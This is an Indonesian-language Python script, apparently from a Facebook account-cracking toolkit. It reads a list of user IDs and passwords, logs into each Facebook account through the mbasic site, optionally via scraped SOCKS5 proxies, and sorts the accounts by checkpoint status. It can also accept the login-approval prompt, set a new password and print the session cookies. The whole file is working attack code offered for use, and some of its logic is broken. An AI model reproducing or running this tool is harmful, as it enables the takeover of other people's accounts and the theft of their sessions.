import requests,re,bs4,sys,os,time,random
from bs4 import BeautifulSoup as parser
ses = requests.Session()

###---[ FITUR APPEND ]--###
ubah,pwbaru,pro = [],[],[]
lopi,slh,cp,tp,ggl = 0,0,0,0,0

###---[ WARNA ]--###
J = '\x1b[38;5;208m'
k = '\033[93m'
P = "\033[0m"
M = "\033[91m"
P = "\033[0m"
hh = "\033[32m"

###---[ USERAGENT ]--###
try:ua = open('.usergetbas.txt','r').read()
except:ua = "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 3S Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.85 Mobile Safari/537.36"

###---[ CLEAR ]--###
def hilang():
	os.system('clear')

###---[ LOGO/BANNER ]--###
def logo():
	print(f"""          __           __              
     ____/ /  ___ ____/ /__            ┌──────────────────────────────┐  
    / __/ _ \/ -_) __/  '_/      __    │  {J}Script By RochmatBasukiXD {P}  │  
    \__/_//_/\__/\__/_/\_(_)__  / /_   │    {J}Github.com/RozhBasXYZ   {P}  │
              / _ \/ _ \/ / _ \/ __/   └──────────────────────────────┘
             / .__/\___/_/_//_/\__/    
            /_/                        \n\n""")

###---[ MENU UTAMA ]--###
def menu():
	hilang()
	logo()
	print("1. cek opsi checkpoint\n2. setting user agent\n3. setting proxy\n4. cara memakai sc\n5. keluar")
	bas = input('menu : ')
	if bas in ['1']:
		main()
	elif bas in ['2']:
		userget()
	elif bas in ['3']:
		prox()
	elif bas in ['4']:
		info()
	else:
		exit()

###---[ INFO PEMAKAIAN ]--###
def info():
	hilang()
	logo()
	print("""1. cek opsi checkpoint\n dalam menu ini ada 3 pertanyaan sebelum anda melakukan cek opsi\n - cara memasukan nama file adalah /sdcard/namafile\n   atau /sdcard/namafolder/namafile\n - pemisah file adalah pemisah di antara\n   user id dan sandi contoh (100002888888 • sandimu)\n   sebaiknya cek terlebih dahulu file anda memakai pemisah jenis apa\n\n2. setting user agent\n dalam menu ini ada dua pilihan cek user agent\n yang terpakai di dalam sc atau ganti user agent\n - cara ganti user agent sesuai merk hp anda adalah\n   dengan cara mencari di google (my user agent) lalu yang muncul\n   di bar pertama adalah user agent hp anda coopy dan masukan ke sc\n\n3. setting proxy\n dalam menu ini ada 2 pilihan\n - pilihan ke satu adalah memakai proxy indonesia\n - pilihan ke dua adalah memakai proxy luar negeri""")

###---[ SETTING USERAGENT ]--###
def userget():
	to = input("1. cek user agent\n2. ganti user agent\nmenu : ")
	if to in ['1']:
		print("user agent : %s%s%s"%(hh,ua,P))
		exit()
	else:pass		
	print("anda bisa memakai user agent hp anda\natau user agent andalan anda")
	ugt = input('user agent : ')
	try:os.remove('.usergetbas.txt')
	except:pass
	open('.usergetbas.txt','w').write(ugt)
	print("sukses setting user agent\nuser agent : %s%s%s\nenter untuk kembali"%(hh,ugt,P))
	input("")
	menu()

###---[ SETTING PROXY ]--###
def prox():
	wow = input("1. random proxy indonesia\n2. random proxy luar negeri\nmenu : ")
	if wow in ['1']:
		sock = session.get('https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=100000000&country=ID&ssl=ID&anonymity=ID').text
		open('.prox.txt','w').write(sock)
		print(sock,"\nberhasil setting proxy indonesia")
		exit()
	else:pass
	sock2 = session.get('https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=100000000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(sock2)
	print(sock2,"\nberhasil setting proxy luar negeri")
	exit()

###---[ OPEN FILE ]--###
def main():
	global lopi,slh,cp,tp,ggl
	ba = input("nama file : ")
	try:data = open(ba,"r").readlines()
	except FileNotFoundError:exit("file tidak ada")
	pm = input("pemisah file : ")
	proc = input("gunakan proxy (tidak rekomendasi)\nproxy [y/t] : ")
	if proc in ['y','Y']:
		pro.append("y")
	else:pass
	pwn = input("ubah sandi tap yes [y/t] : ")
	if pwn in ["y","Y"]:
		ubah.append("y")
		new = input("sandi baru : ")
		if len(new) <= 5:
			print("sandi minimal 6 huruf")
			new = input("sandi baru : ")
		pwbaru.append(new)
	else:pass
	print(f"jumlah akun di file {k}%s {P}adalah {k}%s{P}\n[{k}•{P}]\n{M} |{P}"%(ba,len(data)))
	babaz(pm,data)
	
	
###---[ GET OPSI ]--###
def babaz(pm,data):
	global lopi,slh,cp,tp,ggl
	try:prox = open('.prox.txt','r').read().splitlines()
	except:prox = ["101.36.107.134:65005","103.120.39.104:5678","1.32.59.217:47045","1.179.147.5:52210","102.223.49.74:8080","102.141.197.17:8080","102.176.228.45:4145"]
	proxy = {'http': 'socks5://'+random.choice(prox)}			
	for user in data:
		try:idf,pw = user.split(pm)
		except ValueError:exit("pemisah salah, file anda memakai pemisah "+user)
		print(f"{M} |{P}\n[{k}•{P}]\nmencoba login ke\nemail : {k}{idf}\n{P}sandi : {k}{pw}{P}",end=' ')
		ses.headers.update({"Host":"mbasic.facebook.com","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9","referer":"https://mbasic.facebook.com/","user-agent":ua})
		if "y" in pro:
			soup=parser(ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8",proxies=proxy).text,"html.parser")
		else:
			soup=parser(ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
		link=soup.find("form",{"method":"post"})
		data,data2 = {},{}
		data_ubah,data_ubah2 = {},{}
		for x in soup("input"):
			data.update({x.get("name"):x.get("value")})
		data.update({"email":idf,"pass":pw})
		url=ses.post("https://mbasic.facebook.com"+link.get("action"),data=data)
		response=parser(url.text, "html.parser")
		if "c_user" in ses.cookies.get_dict():
			if "Akun Anda Dikunci" in url.text:
				print(f"[{k}•{P}] {k}akun terkena sesi new{P}")
				cp+=1
			else:
				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items()])
				print(f"[{hh}•{P}] {hh}akun tidak checkpoint{P}")
				tp+=1
		elif "checkpoint" in ses.cookies.get_dict():
			cp+=1
			coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items()])
			title=re.findall("\<title>(.*?)<\/title>",str(response))
			link2=response.find("form",{"method":"post"})
			listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
			for x in response("input"):
				if x.get("name") in listInput:
					data2.update({x.get("name"):x.get("value")})
			try:an=ses.post("https://mbasic.facebook.com"+link2.get("action"),data=data2)
			except:time.sleep(1)
			response2=parser(an.text,"html.parser")
			cek=[cek.text for cek in response2.find_all("option")]
			number=0
			print(f"{P}\rterdapat {str(len(cek))} opsi : ")
			if(len(cek)==0):
				if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
					tp+=1
					if "y" in ubah:
						but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
						for x in response("input"):
							if x.get("name") in but:
								data_ubah.update({x.get("name"):x.get("value")})
						newpw=ses.post("https://mbasic.facebook.com"+link2.get("action"),data=data_ubah).text
						url_ubahpw=parser(newpw.text,"html.parser")
						get2=ubahPw.find("form",{"method":"post"})
						submit2=["submit[Next]","nh","fb_dtsg","jazoest"]
						if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(url_ubahpw)):
							for b in url_ubahpw("input"):
								data2.update({b.get("name"):b.get("value")})
							data_ubah2.update({"password_new":"".join(pwbaru)})
							po=ses.post("https://mbasic.facebook.com"+get2.get("action"),data=data2)
							coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
							print(f"{hh}akun tap yes, sedang ganti sandi {P}")
							time.sleep(2)
							print(f"\remail : {hh}{idf}                    {P}\nsandi : {hh}{pwbaru[0]}\n{P}cookie : {hh}{coki}  {P}              ")
							print(f"{M} |{P}")
					else:
						coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items()])
						print(f"\r{hh}akun tapyes silahlan login ke mbasic{P}")
				elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
					print(f"\r[{k}•{P}] {k}akun telah terpasang auten{P}")
					print(f"{M} |{P}")
					cp+=1
				else:
						for y in re.findall("\<title>(.*?)<\/title>",str(response)):
							print(f"\r[{k}•{P}] {k}{y}{P}")
						print(f"{M} |{P}")
						ggl+=1
			else:
				number +=1
				cp+=1
				for mek in cek:
					print(f"\r[{k}{str(number)}{P}]. {k}{mek}                      {P}")
				print(f"{M} |{P}")
		else:
			print(f"\r[{k}•{P}] {k}kata sandi salah, atau telah di ubah{P}")
			print(f"{M} |{P}")
			slh+=1
	print(f"{M} |{P}")
	exit(f"[{k}•{P}] sukses deteksi checkpoint\nakun salah sandi : %s\nakun gagal login : %s\nakun tap yes/ok  : %s\nakun checkpoint  : %s"%(slh,ggl,tp,cp))


if __name__=="__main__":
	os.system('git pull')
	os.system('clear')
	menu()
